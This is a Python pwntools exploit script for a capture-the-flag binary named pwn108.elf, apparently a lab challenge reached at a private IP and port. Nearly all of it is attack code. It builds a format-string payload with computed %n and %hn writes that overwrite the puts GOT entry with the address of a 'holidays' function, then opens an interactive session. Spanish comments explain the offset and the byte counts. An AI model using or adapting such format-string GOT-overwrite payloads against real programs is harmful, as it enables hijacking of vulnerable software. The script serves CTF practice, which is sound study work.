#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='x86_64')
context.binary = exe = ELF(b'./pwn108.elf')
context.log_level = 'debug'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("10.10.159.106", 9008)

    return r

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


io = conn()

"""
; var void *buf @ rbp-0x90
; var const char *format @ rbp-0x70 VULNERABLE
; var int64_t canary @ rbp-0x8

Sobreescribir en la tabla GOT puts con holidays

Nuestro input cae en la posici√≥n 10 del FMS
"""
log.info(f"Symbol of holidays address: {exe.symbols['holidays']:x}" )
log.info(f"Symbol of puts GOT: {exe.got['puts']:x}" )

io.recvuntil(b'=[Your name]: ')
io.sendline('Ismael')

# Vulnerability
puts_got_address = exe.got['puts'] 

'''
Number of bytes to write = Desired value - bytes written so far

1st write = (0x40) 64 - 0 = 64
2nd write = (0x123b) 4667 - 64 = 4603
'''

payload = b'%64X%13$n' + b'%4603X%14$hnAAA' + p64(puts_got_address+2) + p64(puts_got_address)
io.send(payload)

io.interactive()

